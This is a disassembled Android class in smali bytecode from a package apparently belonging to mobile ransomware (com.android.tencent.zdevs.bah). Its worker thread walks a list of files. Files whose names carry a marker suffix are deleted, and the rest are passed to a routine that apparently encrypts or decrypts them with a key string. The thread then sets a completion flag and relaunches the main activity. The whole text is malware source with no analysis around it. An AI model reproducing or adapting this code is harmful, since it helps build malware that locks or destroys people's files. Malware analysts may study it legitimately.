.class Lcom/android/tencent/zdevs/bah/sss$100000001;
.super Ljava/lang/Object;
.source "sss.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/android/tencent/zdevs/bah/sss;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000001"
.end annotation


# instance fields
.field private final val$cn:Landroid/content/Context;

.field private final val$cs:Ljava/lang/String;

.field private final val$file:Ljava/io/File;

.field private final val$op:I


# direct methods
.method constructor <init>(Ljava/io/File;Ljava/lang/String;ILandroid/content/Context;)V
    .locals 8

    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move v3, p3

    move-object v4, p4

    move-object v6, v0

    invoke-direct {v6}, Ljava/lang/Object;-><init>()V

    move-object v6, v0

    move-object v7, v1

    iput-object v7, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$file:Ljava/io/File;

    move-object v6, v0

    move-object v7, v2

    iput-object v7, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$cs:Ljava/lang/String;

    move-object v6, v0

    move v7, v3

    iput v7, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$op:I

    move-object v6, v0

    move-object v7, v4

    iput-object v7, v6, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$cn:Landroid/content/Context;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 15
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 66
    move-object v0, p0

    move-object v7, v0

    iget-object v7, v7, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$file:Ljava/io/File;

    invoke-virtual {v7}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuffer;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    invoke-direct {v9}, Ljava/lang/StringBuffer;-><init>()V

    const-string v9, "!\uff01"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v8

    sget-object v9, Lcom/android/tencent/zdevs/bah/MainActivity;->hz:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_1

    .line 67
    move-object v7, v0

    iget-object v7, v7, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$file:Ljava/io/File;

    invoke-virtual {v7}, Ljava/io/File;->delete()Z

    move-result v7

    .line 71
    :goto_0
    const/4 v7, 0x1

    sget v8, Lcom/android/tencent/zdevs/bah/sss;->aa:I

    add-int/2addr v7, v8

    sput v7, Lcom/android/tencent/zdevs/bah/sss;->aa:I

    .line 72
    sget-object v7, Lcom/android/tencent/zdevs/bah/sss;->lstFile:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    sget v8, Lcom/android/tencent/zdevs/bah/sss;->aa:I

    if-gt v7, v8, :cond_0

    .line 73
    const/4 v7, 0x0

    sput v7, Lcom/android/tencent/zdevs/bah/sss;->aa:I

    .line 74
    new-instance v7, Ljava/util/ArrayList;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    invoke-direct {v8}, Ljava/util/ArrayList;-><init>()V

    sput-object v7, Lcom/android/tencent/zdevs/bah/sss;->lstFile:Ljava/util/List;

    .line 76
    move-object v7, v0

    iget-object v7, v7, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$cn:Landroid/content/Context;

    const-string v8, "XH"

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v7

    move-object v2, v7

    .line 77
    move-object v7, v2

    invoke-interface {v7}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v7

    move-object v3, v7

    .line 78
    move-object v7, v3

    const-string v8, "cjk"

    const/4 v9, 0x1

    invoke-interface {v7, v8, v9}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    move-result-object v7

    .line 79
    move-object v7, v3

    invoke-interface {v7}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result v7

    .line 80
    sget-object v7, Lcom/android/tencent/zdevs/bah/MainActivity;->instance:Lcom/android/tencent/zdevs/bah/MainActivity;

    invoke-virtual {v7}, Lcom/android/tencent/zdevs/bah/MainActivity;->finish()V

    .line 81
    new-instance v7, Landroid/content/Intent;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    move-object v9, v0

    iget-object v9, v9, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$cn:Landroid/content/Context;

    :try_start_0
    const-string v10, "com.android.tencent.zdevs.bah.MainActivity"

    invoke-static {v10}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v10

    invoke-direct {v8, v9, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v4, v7

    .line 82
    move-object v7, v0

    iget-object v7, v7, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$cn:Landroid/content/Context;

    move-object v8, v4

    invoke-virtual {v7, v8}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :cond_0
    return-void

    .line 69
    :cond_1
    move-object v7, v0

    iget-object v7, v7, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$file:Ljava/io/File;

    move-object v8, v0

    iget-object v8, v8, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$cs:Ljava/lang/String;

    move-object v9, v0

    iget v9, v9, Lcom/android/tencent/zdevs/bah/sss$100000001;->val$op:I

    invoke-static {v7, v8, v9}, Lcom/android/tencent/zdevs/bah/sss;->jj(Ljava/io/File;Ljava/lang/String;I)V

    goto :goto_0

    .line 81
    :catch_0
    move-exception v7

    move-object v5, v7

    new-instance v7, Ljava/lang/NoClassDefFoundError;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    move-object v9, v5

    invoke-virtual {v9}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v7
.end method
